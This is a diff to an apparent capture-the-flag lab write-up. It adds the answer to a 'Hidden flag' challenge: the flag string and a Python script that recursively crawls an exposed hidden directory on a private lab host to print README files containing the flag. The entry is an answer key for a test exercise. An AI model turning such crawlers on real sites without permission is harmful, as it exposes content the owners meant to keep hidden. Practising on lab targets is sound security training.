@@ -213,5 +213,29 @@ flag retreive
 
 ## 14 - Hidden flag
 ### Flag
+d5eec3ec36cf80dce44a896f961c1831a05526ec215693c8f2c39543497d4466
 
 ### Reproduce
+```
+import requests
+from bs4 import BeautifulSoup
+import urllib.request as urllib2
+
+URL = "http://192.168.1.199/.hidden/"
+
+def print_readme(url):
+    page = requests.get(url)
+    soup = BeautifulSoup(page.content, "html.parser")
+
+    for link in soup.find_all('a'):
+        if (link.get('href') == "README"):
+            filedata = urllib2.urlopen(url + "README")
+            data = filedata.read().decode("utf-8")
+            if "flag" in data:
+                print(data)
+                exit()
+        elif (link.get('href') != "../"):
+            print_readme(url + link.get('href'))
+
+print_readme(URL)
+```
